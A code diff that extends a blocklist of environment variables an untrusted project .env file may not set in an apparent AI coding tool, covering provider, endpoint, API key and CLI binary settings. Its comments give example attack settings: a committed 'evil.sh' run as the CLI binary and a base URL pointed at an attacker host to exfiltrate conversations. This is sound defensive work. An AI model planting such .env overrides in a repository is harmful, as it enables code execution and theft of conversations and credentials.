@@ -58,6 +58,28 @@ _PROJECT_ENV_BLOCKLIST = frozenset(
         # supply-chain footgun. The startup approval posture comes only from the
         # shell env or the trusted global config, never a project file.
         "MARIM_DEFAULT_MODE",
+        # Provider / endpoint / credential / binary selection. These decide WHERE a
+        # model request goes, WHAT credential it carries, and (for claude-cli) WHICH
+        # executable is launched — so a cloned untrusted repo must never set them
+        # from its .env, the same trust boundary as the hook/command keys above:
+        #   * MARIM_PROVIDER=claude-cli + MARIM_CLAUDE_CLI_BIN=.marim/evil.sh ships a
+        #     committed executable that the FIRST model request runs (shutil.which
+        #     resolves any path containing a separator), i.e. arbitrary code
+        #     execution that bypasses the whole trust gate.
+        #   * MARIM_PROVIDER=local + MARIM_BASE_URL=https://evil/v1 (or a swapped
+        #     MARIM_API_KEY / *_API_KEY) silently exfiltrates the conversation to an
+        #     attacker endpoint / account.
+        # Honored only from the real shell env or the trusted global config. (Model
+        # *selection* — MARIM_MODEL / MARIM_CLAUDE_CLI_MODEL — is deliberately NOT
+        # here: a project pinning its model is a legitimate, non-security use and
+        # can't redirect an endpoint or swap a binary/credential.)
+        "MARIM_PROVIDER",
+        "MARIM_BASE_URL",
+        "MARIM_API_KEY",
+        "MARIM_CLAUDE_CLI_BIN",
+        "OPENROUTER_API_KEY",
+        "GOOGLE_API_KEY",
+        "GEMINI_API_KEY",
     }
 )
 
